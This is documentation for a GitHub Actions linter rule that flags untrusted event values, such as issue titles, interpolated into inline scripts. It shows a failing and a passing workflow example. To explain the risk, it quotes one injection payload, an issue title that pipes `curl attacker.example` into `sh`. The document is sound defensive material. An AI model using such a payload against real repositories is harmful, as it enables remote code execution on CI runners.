# untrusted-input

| Kind | Category | Default severity |
|---|---|---|
| `expression` | correctness | error |

A script reads a value that someone outside the repository can set.

The rule checks `run:` scripts and the `script` input of `actions/github-script`. The untrusted values include the titles and bodies of issues, pull requests, and comments, commit messages and authors, and the head branch of a pull request. A value that a function only tests, such as the result of `contains()`, cannot inject code and is not reported.

## Why

GitHub replaces `${{ }}` in a script with the value before the shell runs it. An issue titled `'; curl attacker.example | sh; '` turns `echo '${{ github.event.issue.title }}'` into a command that the attacker chose. An environment variable passes the value as data.

## Failing example

```yaml
on: issues
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo '${{ github.event.issue.title }}'
```

```text
test.yaml:6:24: "github.event.issue.title" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [untrusted-input]
```

## Passing example

```yaml
on: issues
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$TITLE"
        env:
          TITLE: ${{ github.event.issue.title }}
      - run: echo '${{ contains(github.event.issue.title, 'bug') }}'
```

## Differences from actionlint

- [Case-insensitive literal index keys](../differences.md#literal-index-case)
- [Every `${{ }}` in a string is checked](../differences.md#all-expressions-in-string)
